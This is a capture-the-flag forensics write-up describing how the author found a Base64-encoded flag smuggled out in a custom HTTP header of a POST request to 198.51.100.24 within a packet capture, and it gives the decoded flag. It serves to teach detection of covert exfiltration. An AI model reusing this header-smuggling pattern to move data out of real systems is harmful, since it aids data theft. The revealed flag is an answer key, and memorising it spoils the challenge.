# Forensic PCAP Secret -- Writeup

## Challenge Summary

I was provided with a packet capture named
`forensic_pcap_secret.pcap.gg` and informed that most of the traffic
consisted of legitimate DNS and HTTP activity. My objective was to
identify the connection that exfiltrated the hidden flag.

## Initial Analysis

I opened the capture in Wireshark and reviewed the protocol hierarchy
and conversation statistics to understand the overall traffic profile.
The capture primarily contained routine DNS lookups and HTTP sessions,
so I concentrated on outbound HTTP communications that appeared unusual.

## Identifying the Suspicious Connection

I inspected each HTTP request, paying particular attention to:

-   External destinations
-   POST requests
-   Custom HTTP headers
-   Encoded values
-   Abnormal request patterns

One request stood out:

``` http
POST /api/sync HTTP/1.1
Host: 198.51.100.24
User-Agent: curl/7.81.0
X-Sync-Token: YXRoZW5he3BjNHBfaDFkMzVfMW5fdzFyM30=
Content-Type: application/json

{"host":"jump01","status":"ok"}
```

Although the JSON body appeared completely benign, the custom
`X-Sync-Token` header contained a Base64-looking string.

## Recovering the Flag

The header value was:

    YXRoZW5he3BjNHBfaDFkMzVfMW5fdzFyM30=

Decoding the Base64 string produced:

    athena{pc4p_h1d35_1n_w1r3}

This matched the expected flag format.

## Why It Was Hidden

The exfiltration relied on hiding the sensitive data inside a custom
HTTP header rather than inside the request body. The body contained only
harmless status information, making the request appear legitimate during
a superficial inspection.

## Final Flag

``` text
athena{pc4p_h1d35_1n_w1r3}
```

## Conclusion

I recovered the flag by examining HTTP metadata rather than focusing
solely on the request payload. Identifying the custom header and
decoding its Base64 value revealed the hidden exfiltrated data.
